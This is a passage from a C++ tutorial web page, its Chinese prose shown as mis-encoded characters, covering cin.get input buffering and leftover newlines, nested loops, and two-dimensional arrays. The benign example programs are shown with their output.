è¯»å–æœ€å¤š BUFFER_SIZE - 1 ä¸ªå­—ç¬¦ï¼Œæˆ–ç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(name, BUFFER_SIZE); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ£€æŸ¥è¯»å–æ˜¯å¦æˆåŠŸä»¥åŠæ˜¯å¦è¿˜æœ‰å‰©ä½™å­—ç¬¦ï¼ˆæ¢è¡Œç¬¦ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>) &#123; <span class="comment">// æ£€æŸ¥æµçŠ¶æ€æ˜¯å¦è‰¯å¥½</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name entered: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é—®é¢˜ï¼šæ¢è¡Œç¬¦ &#x27;\n&#x27; ä»ç„¶ç•™åœ¨è¾“å…¥æµä¸­ï¼</span></span><br><span class="line">        <span class="comment">// å¦‚æœç›´æ¥è°ƒç”¨ä¸‹ä¸€ä¸ª get æˆ– getlineï¼Œå®ƒä¼šç«‹å³è¯»åˆ°æ¢è¡Œç¬¦</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å¤„ç†æ®‹ç•™çš„æ¢è¡Œç¬¦</span></span><br><span class="line">        <span class="comment">// æ–¹æ³•1: è¯»å–å¹¶ä¸¢å¼ƒå•ä¸ªå­—ç¬¦ (å¦‚æœæ˜¯æ¢è¡Œç¬¦)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.peek() == <span class="string">&#x27;\n&#x27;</span>) &#123; <span class="comment">// peek() æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦ä½†ä¸è¯»å–</span></span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(); <span class="comment">// è¯»å–å¹¶ä¸¢å¼ƒä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ–¹æ³•2: è¯»å–å¹¶ä¸¢å¼ƒç›´åˆ°æ¢è¡Œç¬¦ (æ›´é€šç”¨)</span></span><br><span class="line">        <span class="comment">// std::cin.ignore(10000, &#x27;\n&#x27;); </span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your address (max &quot;</span> &lt;&lt; BUFFER_SIZE - <span class="number">1</span> &lt;&lt; <span class="string">&quot; chars): &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.get(address, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address entered: &quot;</span> &lt;&lt; address &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error reading address or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error reading name or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¸ <code>getline(cin, string)</code> çš„æ¯”è¾ƒ:</strong></p><ul><li><code>cin.get(buffer, size)</code>:<ul><li>  ç”¨äº C é£æ ¼å­—ç¬¦æ•°ç»„ã€‚</li><li>  éœ€è¦æŒ‡å®šç¼“å†²åŒºå¤§å°ä»¥é˜²æ­¢æº¢å‡ºã€‚</li><li>  <strong>ä¸è¯»å–</strong>åˆ†éš”ç¬¦ï¼Œåˆ†éš”ç¬¦ç•™åœ¨æµä¸­ã€‚</li><li>  éœ€è¦æ‰‹åŠ¨å¤„ç†ç•™åœ¨æµä¸­çš„åˆ†éš”ç¬¦ã€‚</li></ul></li><li><code>getline(cin, str)</code>:<ul><li>  ç”¨äº <code>std::string</code> å¯¹è±¡ã€‚</li><li>  è‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œæ— éœ€æ‹…å¿ƒç¼“å†²åŒºæº¢å‡ºã€‚</li><li>  <strong>è¯»å–å¹¶ä¸¢å¼ƒ</strong>åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸º <code>\n</code>ï¼‰ã€‚</li><li>  é€šå¸¸æ›´æ–¹ä¾¿ã€æ›´å®‰å…¨ã€‚</li></ul></li></ul><p>ç”±äº <code>cin.get(buffer, size)</code> ä¸è¯»å–åˆ†éš”ç¬¦å¹¶å°†å…¶ç•™åœ¨æµä¸­ï¼Œè¿™å¸¸å¸¸å¯¼è‡´åç»­è¾“å…¥å‡ºç°é—®é¢˜ã€‚å› æ­¤ï¼Œåœ¨ç°ä»£ C++ ä¸­ï¼Œå½“éœ€è¦è¯»å–æ•´è¡Œæ–‡æœ¬æ—¶ï¼Œ**å¼ºçƒˆæ¨èä½¿ç”¨ <code>getline(cin, std::string)</code>**ã€‚<code>cin.get(buffer, size)</code> ä¸»è¦ç”¨äºéœ€è¦ä¸ C é£æ ¼å­—ç¬¦ä¸² API äº¤äº’æˆ–æœ‰ç‰¹å®šé™åˆ¶çš„åœºæ™¯ã€‚</p><h2 id="5-6-åµŒå¥—å¾ªç¯å’ŒäºŒç»´æ•°ç»„"><a href="#5-6-åµŒå¥—å¾ªç¯å’ŒäºŒç»´æ•°ç»„" class="headerlink" title="5.6 åµŒå¥—å¾ªç¯å’ŒäºŒç»´æ•°ç»„"></a>5.6 åµŒå¥—å¾ªç¯å’ŒäºŒç»´æ•°ç»„</h2><p><strong>åµŒå¥—å¾ªç¯ (Nested Loop)</strong> æ˜¯æŒ‡ä¸€ä¸ªå¾ªç¯ç»“æ„å®Œå…¨åŒ…å«åœ¨å¦ä¸€ä¸ªå¾ªç¯ç»“æ„çš„å¾ªç¯ä½“å†…éƒ¨ã€‚å¤–å±‚å¾ªç¯æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œå†…å±‚å¾ªç¯ä¼šå®Œæ•´åœ°æ‰§è¡Œä¸€éï¼ˆä»å¼€å§‹åˆ°ç»“æŸï¼‰ã€‚åµŒå¥—å¾ªç¯å¸¸ç”¨äºå¤„ç†å…·æœ‰å¤šç»´ç»“æ„çš„æ•°æ®ï¼Œä¾‹å¦‚è¡¨æ ¼ã€çŸ©é˜µæˆ–å›¾åƒçš„åƒç´ ã€‚</p><p><strong>äºŒç»´æ•°ç»„ (Two-Dimensional Array)</strong> æ˜¯æ•°ç»„çš„ä¸€ç§æ‰©å±•ï¼Œå¯ä»¥çœ‹ä½œæ˜¯â€œæ•°ç»„çš„æ•°ç»„â€ã€‚å®ƒåœ¨æ¦‚å¿µä¸Šåƒä¸€ä¸ªè¡¨æ ¼æˆ–ç½‘æ ¼ï¼Œæœ‰è¡Œ (row) å’Œåˆ— (column)ã€‚äºŒç»´æ•°ç»„æ˜¯ä½¿ç”¨åµŒå¥—å¾ªç¯å¤„ç†çš„å…¸å‹æ•°æ®ç»“æ„ã€‚</p><p><strong>åµŒå¥—å¾ªç¯ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> ROWS = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> COLS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Nested loop example (printing coordinates):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤–å±‚å¾ªç¯æ§åˆ¶è¡Œ</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROWS; ++i) &#123; </span><br><span class="line">        <span class="comment">// å†…å±‚å¾ªç¯æ§åˆ¶åˆ—</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            <span class="comment">// å¯¹äºå¤–å±‚å¾ªç¯çš„æ¯æ¬¡è¿­ä»£ (i)ï¼Œå†…å±‚å¾ªç¯ä¼šå®Œæ•´æ‰§è¡Œä¸€é (j ä» 0 åˆ° COLS-1)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; j &lt;&lt; <span class="string">&quot;) &quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ¯è¡Œç»“æŸåæ¢è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nested loop example (printing coordinates):</span><br><span class="line">(0,0) (0,1) (0,2) (0,3) </span><br><span class="line">(1,0) (1,1) (1,2) (1,3) </span><br><span class="line">(2,0) (2,1) (2,2) (2,3) </span><br></pre></td></tr></table></figure><h3 id="5-6-1-åˆå§‹åŒ–äºŒç»´æ•°ç»„"><a href="#5-6-1-åˆå§‹åŒ–äºŒç»´æ•°ç»„" class="headerlink" title="5.6.1 åˆå§‹åŒ–äºŒç»´æ•°ç»„"></a>5.6.1 åˆå§‹åŒ–äºŒç»´æ•°ç»„</h3><p>å£°æ˜äºŒç»´æ•°ç»„éœ€è¦æŒ‡å®šä¸¤ä¸ªç»´åº¦çš„å¤§å°ï¼šç¬¬ä¸€ä¸ªæ˜¯<strong>è¡Œæ•°</strong>ï¼Œç¬¬äºŒä¸ªæ˜¯<strong>åˆ—æ•°</strong>ã€‚</p><p><strong>å£°æ˜è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[numberOfRows][numberOfColumns];</span><br></pre></td></tr></table></figure><p><strong>åˆå§‹åŒ–æ–¹æ³•:</strong></p><p>å¯ä»¥ä½¿ç”¨åµŒå¥—çš„èŠ±æ‹¬å· <code>&#123;&#125;</code> æ¥åˆå§‹åŒ–äºŒç»´æ•°ç»„ã€‚å¤–å±‚èŠ±æ‹¬å·ä»£è¡¨æ•´ä¸ªæ•°ç»„ï¼Œå†…å±‚èŠ±æ‹¬å·ä»£è¡¨æ¯ä¸€è¡Œã€‚</p><ol><li><strong>å®Œæ•´åˆå§‹åŒ–:</strong> æä¾›æ‰€æœ‰è¡Œçš„åˆå§‹åŒ–åˆ—è¡¨ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> matrix[<span class="number">3</span>][<span class="number">4</span>] = &#123; <span class="comment">// 3 è¡Œ 4 åˆ—</span></span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,    <span class="comment">// åˆå§‹åŒ–ç¬¬ 0 è¡Œ</span></span><br><span class="line">    &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,    <span class="comment">// åˆå§‹åŒ–ç¬¬ 1 è¡Œ</span></span><br><span class="line">    &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;  <span class="comment">// åˆå§‹åŒ–ç¬¬ 2 è¡Œ</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>éƒ¨åˆ†åˆå§‹åŒ–:</strong> å¦‚æœæä¾›çš„åˆå§‹åŒ–å€¼ä¸è¶³ï¼Œå‰©ä½™å…ƒç´ ä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸º 0ï¼ˆå¯¹äºæ•°å€¼ç±»å‹ï¼‰ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> partial[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>&#125;,          <span class="comment">// ç¬¬ 0 è¡Œ: &#123;1, 2, 0, 0&#125;</span></span><br><span class="line">    &#123;<span class="number">5</span>&#125;              <span class="comment">// ç¬¬ 1 è¡Œ: &#123;5, 0, 0, 0&#125;</span></span><br><span class="line">                     <span class="comment">// ç¬¬ 2 è¡Œ: &#123;0, 0, 0, 0&#125; (æœªæä¾›åˆå§‹åŒ–åˆ—è¡¨)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†æ•´ä¸ªäºŒç»´æ•°ç»„åˆå§‹åŒ–ä¸º 0</span></span><br><span class="line"><span class="keyword">int</span> allZeros[<span class="number">10</span>][<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// æˆ– C++11: int allZeros[10][20] &#123;&#125;;</span></span><br></pre></td></tr></table></figure></li><li><strong>çœç•¥è¡Œæ•° (ä½†ä¸èƒ½çœç•¥åˆ—æ•°):</strong> å¦‚æœåœ¨å£°æ˜æ—¶æä¾›äº†åˆå§‹åŒ–åˆ—è¡¨ï¼Œå¯ä»¥çœç•¥ç¬¬ä¸€ä¸ªç»´åº¦ï¼ˆè¡Œæ•°ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®åˆå§‹åŒ–åˆ—è¡¨æ¨æ–­è¡Œæ•°ã€‚<strong>ä½†ç¬¬äºŒä¸ªç»´åº¦ï¼ˆåˆ—æ•°ï¼‰å¿…é¡»æŒ‡å®šã€‚</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> inferredRows[][<span class="number">4</span>] = &#123; <span class="comment">// åˆ—æ•°å¿…é¡»æ˜¯ 4</span></span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>&#125;</span><br><span class="line">&#125;; <span class="comment">// ç¼–è¯‘å™¨æ¨æ–­è¡Œæ•°ä¸º 2</span></span><br></pre></td></tr></table></figure></li><li><strong>C++11 åˆ—è¡¨åˆå§‹åŒ–:</strong> å¯ä»¥çœç•¥ç­‰å· <code>=</code>ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> matrix_cpp11[<span class="number">2</span>][<span class="number">3</span>] &#123; &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">int</span> zeros_cpp11[<span class="number">5</span>][<span class="number">5</span>] &#123;&#125;; <span class="comment">// æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸º 0</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®Œæ•´åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">2</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éƒ¨åˆ†åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">float</span> coords[<span class="number">3</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1.1f</span>, <span class="number">2.2f</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3.3f</span>&#125; <span class="comment">// &#123;3.3f, 0.0f&#125;</span></span><br><span class="line">        <span class="comment">// ç¬¬ä¸‰è¡Œä¸º &#123;0.0f, 0.0f&#125;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// çœç•¥è¡Œæ•°</span></span><br><span class="line">    <span class="keyword">char</span> messages[][<span class="number">10</span>] = &#123; <span class="comment">// åˆ—æ•°å¿…é¡»æŒ‡å®š</span></span><br><span class="line">        <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">        <span class="string">&quot;World&quot;</span></span><br><span class="line">    &#125;; <span class="comment">// æ¨æ–­ä¸º 2 è¡Œ 10 åˆ—</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">int</span> table[<span class="number">2</span>][<span class="number">2</span>] &#123; &#123;<span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">4</span>&#125; &#125;; <span class="comment">// &#123;&#123;1, 0&#125;, &#123;3, 4&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;data[1][1]: &quot;</span> &lt;&lt; data[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 50</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;coords[1][1]: &quot;</span> &lt;&lt; coords[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;messages[0]: &quot;</span> &lt;&lt; messages[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;table[0][1]: &quot;</span> &lt;&lt; table[<span class="number">0</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-6-2-ä½¿ç”¨äºŒç»´æ•°ç»„"><a href="#5-6-2-ä½¿ç”¨äºŒç»´æ•°ç»„" class="headerlink" title="5.6.2 ä½¿ç”¨äºŒç»´æ•°ç»„"></a>5.6.2 ä½¿ç”¨äºŒç»´æ•°ç»„</h3><p>è®¿é—®äºŒç»´æ•°ç»„çš„å…ƒç´ éœ€è¦æä¾›ä¸¤ä¸ªç´¢å¼•ï¼šç¬¬ä¸€ä¸ªæ˜¯<strong>è¡Œç´¢å¼•</strong>ï¼Œç¬¬äºŒä¸ªæ˜¯<strong>åˆ—ç´¢å¼•</strong>ã€‚ç´¢å¼•åŒæ ·ä» 0 å¼€å§‹ã€‚</p><p><strong>è®¿é—®è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayName[rowIndex][columnIndex]</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨åµŒå¥—å¾ªç¯å¤„ç†äºŒç»´æ•°ç»„:</strong></p><p>åµŒå¥—å¾ªç¯æ˜¯å¤„ç†äºŒç»´æ•°ç»„æ‰€æœ‰å…ƒç´ çš„æ ‡å‡†æ–¹æ³•ã€‚é€šå¸¸ï¼Œå¤–å±‚å¾ªç¯éå†è¡Œï¼Œå†…å±‚å¾ªç¯éå†åˆ—ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_CITIES = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_MONTHS = <span class="number">4</span>; <span class="comment">// å‡è®¾åªè®°å½• 4 ä¸ªæœˆçš„æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å­˜å‚¨ 3 ä¸ªåŸå¸‚ 4 ä¸ªæœˆçš„å¹³å‡æ°”æ¸©</span></span><br><span class="line">    <span class="keyword">double</span> temperatures[NUM_CITIES][NUM_MONTHS] = &#123;</span><br><span class="line">        &#123;<span class="number">10.5</span>, <span class="number">12.1</span>, <span class="number">15.3</span>, <span class="number">18.0</span>&#125;, <span class="comment">// City 0</span></span><br><span class="line">        &#123;<span class="number">8.2</span>, <span class="number">9.5</span>, <span class="number">13.0</span>, <span class="number">16.5</span>&#125;,  <span class="comment">// City 1</span></span><br><span class="line">        &#123;<span class="number">12.0</span>, <span class="number">14.5</span>, <span class="number">17.8</span>, <span class="number">21.2</span>&#125;  <span class="comment">// City 2</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Monthly average temperatures:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨åµŒå¥—å¾ªç¯éå†å¹¶æ‰“å°æ‰€æœ‰æ¸©åº¦</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> city = <span class="number">0</span>; city &lt; NUM_CITIES; ++city) &#123; <span class="comment">// å¤–å±‚å¾ªç¯éå†åŸå¸‚ (è¡Œ)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> month = <span class="number">0</span>; month &lt; NUM_MONTHS; ++month) &#123; <span class="comment">// å†…å±‚å¾ªç¯éå†æœˆä»½ (åˆ—)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; temperatures[city][month] &lt;&lt; <span class="string">&quot;\t&quot;</span>; <span class="comment">// ä½¿ç”¨è¡Œå’Œåˆ—ç´¢å¼•è®¿é—®å…ƒç´ </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®— City 1 çš„æ€»æ¸©åº¦å’Œå¹³å‡æ¸©åº¦</span></span><br><span class="line">    <span class="keyword">double</span> city1_total = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">int</span> city_index = <span class="number">1</span>; <span class="comment">// è¦è®¡ç®—çš„åŸå¸‚ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> month = <span class="number">0</span>; month &lt; NUM_MONTHS; ++month) &#123;</span><br><span class="line">        city1_total += temperatures[city_index][month];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> city1_average = city1_total / NUM_MONTHS;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAverage temperature for City &quot;</span> &lt;&lt; city_index &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; city1_average &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—æ‰€æœ‰åŸå¸‚ç¬¬ä¸€ä¸ªæœˆçš„å¹³å‡æ¸©åº¦</span></span><br><span class="line">    <span class="keyword">double</span> month0_total = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">int</span> month_index = <span class="number">0</span>; <span class="comment">// è¦è®¡ç®—çš„æœˆä»½ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> city = <span class="number">0</span>; city &lt; NUM_CITIES; ++city) &#123;</span><br><span class="line">        month0_total += temperatures[city][month_index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> month0_average = month0_total / NUM_CITIES;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average temperature for Month &quot;</span> &lt;&lt; month_index &lt;&lt; <span class="string">&quot; across all cities: &quot;</span> &lt;&lt; month0_average &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å†…å­˜å¸ƒå±€:</strong><br>åœ¨å†…å­˜ä¸­ï¼ŒäºŒç»´æ•°ç»„é€šå¸¸æ˜¯æŒ‰<strong>è¡Œä¸»åº (Row-Major Order)</strong> å­˜å‚¨çš„ã€‚è¿™æ„å‘³ç€ç¬¬ä¸€è¡Œçš„æ‰€æœ‰å…ƒç´ 